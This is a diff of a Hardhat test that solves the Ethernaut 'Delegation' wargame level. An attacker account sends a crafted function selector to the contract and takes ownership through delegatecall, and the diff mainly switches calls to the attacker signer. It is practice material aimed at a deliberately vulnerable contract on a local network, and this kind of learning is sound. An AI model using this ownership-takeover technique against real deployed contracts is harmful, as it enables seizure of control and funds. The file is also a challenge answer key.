@@ -3,7 +3,6 @@ import { expect } from "chai";
 import { Interface } from "ethers/lib/utils";
 import { ethers } from "hardhat";
 
-// Not Working
 describe("Delegation exploit", () => {
   async function deployDelegationFixture() {
     const [deployer, attacker] = await ethers.getSigners();
@@ -12,9 +11,9 @@ describe("Delegation exploit", () => {
     const delegationFactory = await DelegationFactory.connect(deployer).deploy();
 
     // Simulate execution of createInstance to get return value of the function(address of deployed instance)
-    const delegationAddress = await delegationFactory.connect(deployer).callStatic.createInstance(attacker.address);
+    const delegationAddress = await delegationFactory.connect(attacker).callStatic.createInstance(attacker.address);
 
-    const tx = await delegationFactory.createInstance(attacker.address);
+    const tx = await delegationFactory.connect(attacker).createInstance(attacker.address);
     await tx.wait();
 
     const delegation = await ethers.getContractAt("Delegation", delegationAddress);
@@ -36,7 +35,7 @@ describe("Delegation exploit", () => {
     console.log("------------------------------------------------------- Attacker : ", attacker.address);
     console.log("------------------------------------------------------- Owner Before : ", await delegation.owner());
 
-    const tx = await attacker.sendTransaction({
+    let tx = await attacker.sendTransaction({
       to: delegation.address,
       data: selector,
     });
@@ -50,7 +49,7 @@ describe("Delegation exploit", () => {
     //expect(newOwner).to.be.equal(attacker.address, "Failed!!!");
 
     // Validate instance using Ethernaut validation
-    const success = await delegationFactory.validateInstance(delegation.address, attacker.address);
+    const success = await delegationFactory.connect(attacker).validateInstance(delegation.address, attacker.address);
     expect(success).to.equal(true, "Delegation Failed!!!");
   });
 });
